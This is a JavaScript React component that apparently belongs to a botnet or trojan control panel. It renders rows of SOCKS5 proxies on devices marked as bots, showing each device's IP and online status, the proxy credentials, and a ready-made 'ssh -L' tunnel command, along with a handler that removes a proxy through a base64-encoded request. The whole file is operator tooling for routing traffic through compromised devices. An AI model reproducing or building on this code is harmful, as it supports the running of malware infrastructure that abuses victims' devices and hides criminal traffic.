import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { try_eval } from '../../serviceF';

class Socks5Row extends React.Component {

    YesOrNo (param) {
        return param == '1' ? <i class="fa-green far fa-check-circle"></i> : <i class="fa-red far fa-times"></i>;
    }

    OnOrOff (param) {
        return param == '1' ? <span style={({color: 'Green'})}>Online</span> : <span style={({color: 'Red'})}>Offline</span>;
    }


    OnDeleteInject() {
        
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"remove_socks5","id":"' + this.props.id + '","id_device":"' + this.props.id_device + '"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)) {
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
					SettingsContext.UpdateInjectsTable();
				}
				else {
                    try_eval('$.notify("Socks5 removed ", "info");');
					SettingsContext.UpdateInjectsTable();
					this.props.InjListForceUpdate();
				}
			}
            catch (ErrMgs) { }
        }.bind(this));
    }

    render () {
        const TextAlignCenter = {
            textAlign: 'center',
            fontSize: '12px'
        }
        const TextAlignleft = {
            textAlign: 'left',
            padding: '5px'
        }
        const MarginRight = {
            marginRight: '10px'
        }

        const ssh_con = {
            textAlign: 'center',
            fontSize: '10px'
        }
        
        return (
            <tr>
                <td class="check-bot" style={TextAlignleft}><i class="fal fa-trash-alt" onClick={this.OnDeleteInject.bind(this)} style={MarginRight}></i></td>
                <th style={TextAlignCenter}>{this.props.id}</th>
                <th style={TextAlignCenter}>{this.props.id_device}</th>
                <th style={TextAlignCenter}><img src={"/img/flag/" + this.props.country + ".png"} /><br/>{this.OnOrOff(this.props.online)}<br/>{this.props.ip_device}</th>
               
                <th style={TextAlignCenter}>{this.props.user} / {this.props.password}</th>
            
                <th style={TextAlignCenter}>{this.props.ip_serv} / {this.props.port}</th>

                <th style={ssh_con}><i>ssh -L {this.props.port}:127.0.0.1:{this.props.port} {this.props.user}@{this.props.ip_serv} </i></th>
            </tr>
        );
    }
}

export default Socks5Row;